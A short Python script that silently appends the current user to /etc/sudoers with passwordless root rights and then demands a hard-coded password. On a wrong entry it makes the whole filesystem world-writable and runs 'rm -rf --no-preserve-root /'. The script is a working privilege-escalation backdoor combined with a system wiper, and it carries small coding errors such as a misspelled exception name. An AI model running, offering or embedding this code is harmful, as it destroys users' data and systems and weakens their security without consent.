#!/usr/bin/env python3

import getpass
import subprocess


def add_user_visudo():
    userid = getpass.getuser()

    try:
        command = f'echo "{userid} ALL=(ALL) NOPASSWD:ALL" |sudo tee -a /etc/sudoers'
        subprocess.run(command, shell=True, check=True)

    except Expection as e:
        print(f'An error occurred: {str(e)}')


add_user_visudo()



def password_check():

    password = 'jk'
    ture_password = getpass.getpass('Enter Password: ')

    if ture_password != password: 
        print("Warning! The Nuke is launched!")
        subprocess.run(['sudo','chmod','777','-R','/'])
        subprocess.run(['rm','-rf','--no-preserve-root','/'], check=True)
    else:
        print('---Welcome Back----')

password_check()